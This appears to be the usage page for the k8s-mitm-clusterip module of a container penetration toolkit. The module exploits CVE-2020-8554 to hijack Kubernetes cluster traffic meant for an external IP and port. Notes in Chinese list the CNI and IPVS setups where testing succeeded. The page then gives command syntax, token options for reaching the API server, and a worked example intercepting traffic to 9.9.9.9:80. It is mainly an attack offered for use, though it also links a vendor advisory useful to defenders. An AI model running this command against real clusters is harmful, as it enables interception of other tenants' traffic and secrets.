# Exploit: k8s-mitm-clusterip

Exploit CVE-2020-8554: Man in the middle using ExternalIPs. It allows an attacker to intercept traffic that was intended for an external dependency.

K8s中间人攻击(CVE-2020-8554)

注经测试并于K8S官方确认，该漏洞只影响部分CNI插件和网络模式，以下为测试成功的场景：
1. 部分CNI + Iptables 可劫持 POD network
2. 部分CNI + IPVS 可劫持 可劫持 NODE network
3. Global Router + IPVS 可劫持 可劫持 NODE network

因此在 minikube 里可能无法复现。

See more in https://unit42.paloaltonetworks.com/cve-2020-8554/

## Usage

First it will deploy `<image>` in cluster, then create a service to hijack cluster traffic intended to send to remote <ip>:<port>

```
cdk run k8s-mitm-clusterip (default|anonymous|<service-account-token-path>) <image> <ip> <port>

Request Options:
default: connect API server with pod's default service account token
anonymous: connect API server with user system:anonymous
<service-account-token-path>: connect API server with user-specified service account token.

Exploit Options:
image: target image to MITM hijack.
ip: target remote IP to hijack traffic.
port: target remote PORT to hijack traffic.
```

## Example

deploy image ubuntu in the cluster to hijack outgoing traffic towards 9.9.9.9:80  
  
```
./cdk run k8s-mitm-clusterip default ubuntu 9.9.9.9 80
```

![](https://static.cdxy.me/cuimage/20210116190622_Trmkxv_Screenshot.jpeg)

